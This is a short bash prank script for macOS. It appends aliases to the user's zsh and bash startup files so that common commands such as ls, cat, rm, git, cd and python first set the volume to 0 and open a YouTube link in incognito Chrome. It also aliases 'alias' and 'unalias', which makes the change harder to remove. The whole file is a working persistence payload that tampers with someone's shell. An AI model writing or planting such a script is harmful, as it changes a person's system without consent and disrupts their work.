#!/bin/bash
LINK='https://youtu.be/Pgs79yOlhGI?t=2'
VOLUME='0'

for cmd in 'ls' 'cat' 'unalias' 'python' 'python3' 'gcc' 'g++' 'vim' 'cd' 'nano' 'emacs' 'rm' 'git' 'find' 'make' 'open' 'alias' 'source'
do
	ALIAS_FUNCTION="osascript -e 'set Volume ${VOLUME}' && open -na 'Google Chrome' --args --incognito '${LINK}'; ${cmd}"
	ALIAS="alias ${cmd}=\"${ALIAS_FUNCTION}\""
	echo ${ALIAS} >> ~/.zshrc
	echo ${ALIAS} >> ~/.bashrc
	echo ${ALIAS} >> ~/.bash_profile
done
bash -c "source ~/.bash_profile"
bash -c "source ~/.bashrc"
zsh  -c "source ~/.zshrc"
